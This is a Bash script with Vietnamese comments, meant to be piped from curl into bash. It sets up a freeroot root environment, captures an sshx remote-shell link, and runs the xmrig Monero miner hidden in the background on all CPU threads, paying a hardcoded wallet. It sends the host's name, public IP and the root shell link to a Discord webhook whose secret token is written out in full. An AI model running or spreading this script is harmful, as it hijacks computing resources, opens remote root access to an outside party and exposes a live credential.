#!/usr/bin/env bash

# Script one-click: cài freeroot + sshx + đào XMR + log về Discord webhook
# Tên file gợi ý: install-mine-log.sh
# Cách chạy: curl -sSf https://raw.githubusercontent.com/yourusername/yourrepo/main/install-mine-log.sh | bash

set -e  # Dừng nếu lỗi nghiêm trọng

WEBHOOK_URL="https://discord.com/api/webhooks/1458382949006180394/Sp-J4ElLAzQdSuagw-iURZETXP-lOQ3JJBbz4EsiVOJ4YJgjitmunWczbdWU4IuQQs3e"

# Hàm gửi log về Discord (dùng curl, đơn giản, không cần jq)
send_log() {
    local message="$1"
    local color=3066993  # Màu xanh mặc định (thành công)
    [[ "$message" == *"lỗi"* || "$message" == *"thất bại"* ]] && color=15158332  # Đỏ nếu lỗi

    curl -s -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d '{
            "embeds": [{
                "title": "Log từ server mining",
                "description": "'"$(hostname -f || echo 'unknown')" - $(date '+%Y-%m-%d %H:%M:%S')",
                "color": '"$color"',
                "fields": [
                    {"name": "Status", "value": "'"$message"'", "inline": false}
                ],
                "footer": {"text": "Script one-click | IP: '"$(curl -s ifconfig.me || echo 'ẩn')"'"}
            }]
        }' > /dev/null 2>&1 || true  # Không dừng script nếu gửi log lỗi
}

send_log "Bắt đầu chạy script one-click trên $(hostname)"

# 1. Cài gói cơ bản
echo "[1/6] Cập nhật hệ thống + cài curl tar git sudo..."
apt update -y && apt upgrade -y
apt install -y curl tar git sudo || { send_log "Lỗi: Không cài được gói cơ bản"; exit 1; }
send_log "Đã cài gói cơ bản thành công"

# 2. Clone hoặc update freeroot
echo "[2/6] Xử lý freeroot..."
if [ -d "freeroot" ]; then
    cd freeroot
    git pull || echo "Pull thất bại, dùng bản cũ"
else
    git clone https://github.com/foxytouxxx/freeroot.git
    cd freeroot
fi
send_log "Đã clone/update freeroot thành công"

# 3. Chạy root.sh và capture output để lấy link sshx
echo "[3/6] Chạy root.sh (tự yes) và lấy link sshx..."
SSHX_LINK=""

# Dùng expect nếu có, hoặc fallback echo yes
if command -v expect >/dev/null 2>&1; then
    OUTPUT=$(expect <<EOF
    spawn bash root.sh
    expect {
        "yes/no" { send "yes\r"; exp_continue }
        eof
    }
EOF
)
else
    OUTPUT=$(echo "yes" | bash root.sh 2>&1)
fi

# Tìm link sshx trong output (thường dạng https://sshx.io/s/xxxxxx)
SSHX_LINK=$(echo "$OUTPUT" | grep -o 'https://sshx.io/s/[a-zA-Z0-9]\{6,\}' | head -1)

if [ -n "$SSHX_LINK" ]; then
    send_log "root.sh chạy OK! Link SSHX: $SSHX_LINK"
else
    send_log "root.sh chạy xong nhưng KHÔNG tìm thấy link sshx (kiểm tra thủ công)"
fi

cd ~  # Quay về home

# 4. Tải xmrig mới nhất (v6.25.0 static x64)
echo "[4/6] Tải xmrig v6.25.0..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"

rm -f xmrig.tar.gz
curl -L -o xmrig.tar.gz "$XMRIG_URL" || { send_log "Lỗi tải xmrig từ $XMRIG_URL"; exit 1; }

tar -xzf xmrig.tar.gz
chmod +x xmrig-6.25.0/xmrig
send_log "Đã tải và giải nén xmrig v6.25.0 thành công"

# 5. Chạy miner ngầm + log file
echo "[5/6] Khởi động miner..."
cd xmrig-6.25.0

nohup ./xmrig \
  --donate-level=0 \
  --url=pool.supportxmr.com:3333 \
  --user=441a31Nzr1cJLRzwMoUrRV6j1Uj7UqJG7bDJjrZcz8xmD5idyyEWBVn72X4ioYk3Vtg8G8VB1utd2Z7jiqQE57KnStVfYas \
  --pass=x \
  --threads=$(nproc --all) \
  --print-time=60 \
  --background \
  --log-file=/root/xmrig.log > /dev/null 2>&1 &

sleep 5  # Chờ miner khởi động

# Kiểm tra miner có chạy không
if pgrep -x "xmrig" > /dev/null; then
    send_log "Miner đã chạy thành công! Threads: $(nproc --all) | Log: /root/xmrig.log"
    if [ -n "$SSHX_LINK" ]; then
        send_log "Link truy cập SSH root (nếu cần kiểm tra): $SSHX_LINK"
    fi
else
    send_log "Miner KHÔNG chạy (kiểm tra log: cat /root/xmrig.log)"
fi

# 6. Hoàn tất
echo ""
echo "============================================================="
echo " HOÀN TẤT! Miner đang chạy ngầm."
echo " - Log miner: cat /root/xmrig.log | tail -n 50"
echo " - Dừng miner: pkill xmrig"
echo " - Log Discord đã gửi các bước chính (kiểm tra webhook của bạn)"
echo "============================================================="
send_log "Script hoàn tất thành công trên server này"
